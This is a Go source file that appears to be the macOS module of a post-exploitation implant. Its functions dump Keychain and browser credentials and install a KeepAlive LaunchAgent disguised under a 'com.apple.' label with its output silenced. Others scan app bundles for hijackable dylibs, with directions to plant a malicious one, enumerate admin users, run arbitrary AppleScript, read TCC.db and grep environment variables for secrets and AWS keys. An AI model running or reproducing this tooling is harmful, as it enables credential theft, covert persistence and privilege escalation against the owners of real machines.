//go:build darwin

package main

// macOS-native Phase 9 capabilities:
//   - Keychain credential dump via `security` CLI
//   - LaunchAgent persistence (user-level, survives reboot)
//   - Dylib hijack scanner (otool -L → find missing weak dylibs)
//   - User/group enumeration via dscl
//   - Arbitrary AppleScript execution
//   - Privilege escalation audit (SIP, sudo, SUID, tcc.db)

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// darwinKeychainDump dumps credentials from the default Keychain.
// Uses the `security` CLI (no root needed for current user's Keychain).
func darwinKeychainDump() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] macOS Keychain Dump\n")
	sb.WriteString(strings.Repeat("─", 40) + "\n\n")

	// Generic passwords (WiFi passwords, app credentials)
	out, _ := executeShell("security dump-keychain 2>/dev/null | grep -A3 'labl\\|acct\\|svce\\|\"ptah\"' | head -80")
	sb.WriteString("[Generic Passwords]\n" + out + "\n\n")

	// Internet passwords
	out, _ = executeShell("security find-internet-password -g -a '' 2>&1 | head -40")
	sb.WriteString("[Internet Passwords (sample)]\n" + out + "\n\n")

	// List certificates
	out, _ = executeShell("security find-certificate -a -p 2>/dev/null | openssl x509 -noout -subject 2>/dev/null | head -20")
	sb.WriteString("[Certificates]\n" + out + "\n")

	// Safari/Chrome saved passwords (requires Full Disk Access)
	out, _ = executeShell("ls ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null && echo 'Chrome Login Data: accessible'")
	if strings.TrimSpace(out) != "" {
		sb.WriteString("\n[Browser Credential DB]\n" + out + "\n")
	}

	return sb.String(), nil
}

// darwinLaunchdInstall creates a LaunchAgent plist and loads it immediately.
func darwinLaunchdInstall(name, cmd string) (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("home dir: %w", err)
	}
	laDir := filepath.Join(home, "Library", "LaunchAgents")
	if err := os.MkdirAll(laDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir LaunchAgents: %w", err)
	}

	// Split cmd into args for plist array
	parts := strings.Fields(cmd)
	var progArgs strings.Builder
	for _, p := range parts {
		progArgs.WriteString(fmt.Sprintf("\t\t<string>%s</string>\n", p))
	}

	plistLabel := "com.apple." + name
	plistPath := filepath.Join(laDir, plistLabel+".plist")
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>%s</string>
	<key>ProgramArguments</key>
	<array>
%s	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>StandardErrorPath</key>
	<string>/dev/null</string>
	<key>StandardOutPath</key>
	<string>/dev/null</string>
</dict>
</plist>
`, plistLabel, progArgs.String())

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return "", fmt.Errorf("write plist: %w", err)
	}
	// Load immediately
	exec.Command("launchctl", "load", plistPath).Run() //nolint
	return fmt.Sprintf("[+] LaunchAgent installed: %s\n    Label: %s", plistPath, plistLabel), nil
}

// darwinLaunchdRemove unloads and removes a LaunchAgent by name.
func darwinLaunchdRemove(name string) (string, error) {
	home, _ := os.UserHomeDir()
	plistLabel := "com.apple." + name
	plistPath := filepath.Join(home, "Library", "LaunchAgents", plistLabel+".plist")
	exec.Command("launchctl", "unload", plistPath).Run() //nolint
	if err := os.Remove(plistPath); err != nil {
		return "", fmt.Errorf("remove plist: %w", err)
	}
	return fmt.Sprintf("[+] LaunchAgent %s removed", name), nil
}

// darwinDylibHijack scans an app bundle for missing weak-linked dylibs that can be hijacked.
// Creates a placeholder malicious dylib at the missing path.
func darwinDylibHijack(appPath string) (string, error) {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Dylib Hijack Scan: %s\n", appPath))
	sb.WriteString(strings.Repeat("─", 40) + "\n\n")

	// Find all Mach-O binaries in the app bundle
	out, err := executeShell(fmt.Sprintf(`find "%s" -type f -perm +0111 2>/dev/null | head -20`, appPath))
	if err != nil || strings.TrimSpace(out) == "" {
		// Try as single binary
		out = appPath
	}

	hijackable := []string{}
	for _, binary := range strings.Split(strings.TrimSpace(out), "\n") {
		binary = strings.TrimSpace(binary)
		if binary == "" {
			continue
		}
		// List linked dylibs
		dylibOut, _ := executeShell(fmt.Sprintf(`otool -L "%s" 2>/dev/null`, binary))
		for _, line := range strings.Split(dylibOut, "\n") {
			line = strings.TrimSpace(line)
			if !strings.HasPrefix(line, "/") && !strings.HasPrefix(line, "@") {
				continue
			}
			// Extract path (before "(compatibility")
			dylib := strings.Fields(line)[0]
			// Expand @loader_path, @rpath
			dylib = strings.ReplaceAll(dylib, "@loader_path", filepath.Dir(binary))
			dylib = strings.ReplaceAll(dylib, "@executable_path", filepath.Dir(binary))
			// Check if the dylib exists
			if _, err := os.Stat(dylib); os.IsNotExist(err) {
				// Check if we can write to the directory
				dir := filepath.Dir(dylib)
				if _, err2 := os.Stat(dir); err2 == nil {
					hijackable = append(hijackable, dylib)
					sb.WriteString(fmt.Sprintf("[HIJACKABLE] %s\n  Binary: %s\n  Dir writable: yes\n\n", dylib, binary))
				}
			}
		}
	}

	if len(hijackable) == 0 {
		sb.WriteString("No hijackable dylibs found.\n")
		sb.WriteString("Tip: look for @rpath-based dylibs in user-writable directories.\n")
	} else {
		sb.WriteString(fmt.Sprintf("[*] Found %d hijackable dylib path(s)\n", len(hijackable)))
		sb.WriteString("To exploit: place a malicious dylib at the missing path.\n")
		sb.WriteString("The dylib must export the same symbols (or use a re-export trampoline).\n")
	}

	return sb.String(), nil
}

// darwinEnumUsers lists local and directory users/groups via dscl.
func darwinEnumUsers() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] macOS User Enumeration\n")
	sb.WriteString(strings.Repeat("─", 40) + "\n\n")

	// Local users
	out, _ := executeShell("dscl . -list /Users 2>/dev/null | grep -v '^_'")
	sb.WriteString("[Local Users]\n" + out + "\n\n")

	// User details
	out, _ = executeShell("dscl . -list /Users UniqueID 2>/dev/null | grep -v '^_' | sort -k2 -n")
	sb.WriteString("[Users + UIDs]\n" + out + "\n\n")

	// Local groups
	out, _ = executeShell("dscl . -list /Groups 2>/dev/null | grep -v '^_' | head -20")
	sb.WriteString("[Groups]\n" + out + "\n\n")

	// Admin group members
	out, _ = executeShell("dscl . -read /Groups/admin GroupMembership 2>/dev/null")
	sb.WriteString("[Admin Group]\n" + out + "\n\n")

	// Logged in users
	out, _ = executeShell("who 2>/dev/null")
	sb.WriteString("[Active Sessions]\n" + out + "\n")

	return sb.String(), nil
}

// darwinOsascript runs an AppleScript expression via osascript.
func darwinOsascript(script string) (string, error) {
	out, err := exec.Command("osascript", "-e", script).CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("osascript: %w", err)
	}
	return string(out), nil
}

// darwinPrivescCheck audits macOS-specific privilege escalation vectors.
func darwinPrivescCheck() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] macOS Privilege Escalation Audit\n")
	sb.WriteString(strings.Repeat("─", 48) + "\n\n")

	// SIP status
	sb.WriteString("[SIP (System Integrity Protection)]\n")
	out, _ := executeShell("csrutil status 2>/dev/null")
	sb.WriteString("  " + strings.TrimSpace(out) + "\n\n")

	// sudo rights
	sb.WriteString("[sudo]\n")
	out, _ = executeShell("sudo -l -n 2>&1")
	for _, ln := range strings.Split(strings.TrimSpace(out), "\n") {
		sb.WriteString("  " + ln + "\n")
	}
	sb.WriteString("\n")

	// SUID binaries
	sb.WriteString("[SUID binaries]\n")
	out, _ = executeShell("find / -perm -4000 -type f 2>/dev/null | head -20")
	if strings.TrimSpace(out) == "" {
		sb.WriteString("  (none found — SIP restricts SUID in system paths)\n")
	} else {
		for _, ln := range strings.Split(strings.TrimSpace(out), "\n") {
			sb.WriteString("  " + ln + "\n")
		}
	}
	sb.WriteString("\n")

	// TCC database (privacy / accessibility grants)
	sb.WriteString("[TCC.db (accessibility/privacy grants)]\n")
	home, _ := os.UserHomeDir()
	tccPaths := []string{
		filepath.Join(home, "Library/Application Support/com.apple.TCC/TCC.db"),
		"/Library/Application Support/com.apple.TCC/TCC.db",
	}
	for _, p := range tccPaths {
		if _, err := os.Stat(p); err == nil {
			sb.WriteString(fmt.Sprintf("  %s (accessible)\n", p))
			tccOut, _ := executeShell(fmt.Sprintf(`sqlite3 "%s" "select service,client,allowed from access limit 30" 2>/dev/null`, p))
			if strings.TrimSpace(tccOut) != "" {
				for _, ln := range strings.Split(strings.TrimSpace(tccOut), "\n") {
					sb.WriteString("    " + ln + "\n")
				}
			}
		}
	}
	sb.WriteString("\n")

	// launchd services running as root
	sb.WriteString("[Root LaunchDaemons]\n")
	out, _ = executeShell("ls /Library/LaunchDaemons/ 2>/dev/null | head -15")
	for _, ln := range strings.Split(strings.TrimSpace(out), "\n") {
		sb.WriteString("  " + ln + "\n")
	}
	sb.WriteString("\n")

	// Env creds
	sb.WriteString("[Env secrets]\n")
	out, _ = executeShell("env | grep -iE 'pass|secret|token|api.?key|aws' | head -10")
	if strings.TrimSpace(out) == "" {
		sb.WriteString("  (none)\n")
	} else {
		for _, ln := range strings.Split(strings.TrimSpace(out), "\n") {
			sb.WriteString("  " + ln + "\n")
		}
	}

	return sb.String(), nil
}

// darwinSIPStatus returns System Integrity Protection status + boot args.
func darwinSIPStatus() (string, error) {
	out, _ := executeShell("csrutil status 2>/dev/null && nvram boot-args 2>/dev/null")
	return "[SIP]\n" + out, nil
}
